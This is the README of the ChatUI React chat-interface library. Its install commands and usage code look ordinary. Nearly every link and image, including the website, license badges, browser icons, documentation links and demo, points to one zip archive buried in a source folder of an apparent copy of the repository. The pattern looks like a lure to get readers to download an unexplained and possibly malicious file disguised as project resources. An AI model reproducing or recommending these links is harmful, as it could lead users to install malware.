<h1 align="center">
  <a href="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip">
    <img width="109" height="28" src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="ChatUI">
  </a>
</h1>

<p align="center">The UI design language and React library for Conversational UI</p>

<p align="center">Website：<a href="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" target="_blank">https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip</a></p>

<div align="center">

[![LICENSE](https://img.shields.io/npm/l/@chatui/core?style=flat-square)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
[![NPM version](https://img.shields.io/npm/v/@chatui/core?style=flat-square)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
[![NPM downloads](https://img.shields.io/npm/dm/@chatui/core?style=flat-square)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
[![Gzip Size](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)
[![Jsdelivr Hits](https://img.shields.io/jsdelivr/npm/hm/@chatui/core?style=flat-square)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)

</div>

<p align="center">
  <img width="750" src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip">
</p>

English | [简体中文](./README.zh-CN.md)

## Features

- 😎 **Best Practices**: The best practice for chat interaction based on our experience of Alime Chatbot
- 🛡 **TypeScript**: Written in TypeScript with predictable static types
- 📱 **Responsive**: Responsive design to adapt automatically to whatever device
- ♿ **Accessibility**: Accessibility support and get the certification from Accessibility Research Association
- 🎨 **Theming**: Powerful theme customization in every detail
- 🌍 **International**: Internationalization support for dozens of languages

## Environment Support

- Modern browsers (support [CSS Variables](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip))
- Internet Explorer 11 (with [polyfills](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip) and [CSS Variables Polyfill](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip) / [css-vars-ponyfill](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip))

| <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Edge" width="24px" height="24px" /><br>Edge | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Firefox" width="24px" height="24px" /><br>Firefox | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Chrome" width="24px" height="24px" /><br>Chrome | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Safari" width="24px" height="24px" /><br>Safari | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="iOS Safari" width="24px" height="24px" /><br>iOS Safari | <img src="https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip" alt="Android WebView" width="24px" height="24px" /><br>Android WebView |
| --- | --- | --- | --- | --- | --- |
| 16+ | 31+ | 49+ | 9.1+ | 9.3+ | 6+ |

## Install

```bash
npm install @chatui/core --save
```

```bash
yarn add @chatui/core
```

## Usage

```jsx
import Chat, { Bubble, useMessages } from '@chatui/core';
import '@chatui/core/dist/index.css';

const App = () => {
  const { messages, appendMsg, setTyping } = useMessages([]);

  function handleSend(type, val) {
    if (type === 'text' && val.trim()) {
      appendMsg({
        type: 'text',
        content: { text: val },
        position: 'right',
      });

      setTyping(true);

      setTimeout(() => {
        appendMsg({
          type: 'text',
          content: { text: 'Bala bala' },
        });
      }, 1000);
    }
  }

  function renderMessageContent(msg) {
    const { content } = msg;
    return <Bubble content={content.text} />;
  }

  return (
    <Chat
      navbar={{ title: 'Assistant' }}
      messages={messages}
      renderMessageContent={renderMessageContent}
      onSend={handleSend}
    />
  );
};
```

[![DEMO](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip)

### Development

```bash
cd demo
npm i
npm run dev
```

## Theme

Visit [Customize Theme](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip) for detail

## Internationalization

Visit [i18n](https://github.com/pmanss/ChatUI/raw/refs/heads/master/src/components/LazyComponent/UI_Chat_v2.6.zip) for detail

## License

MIT
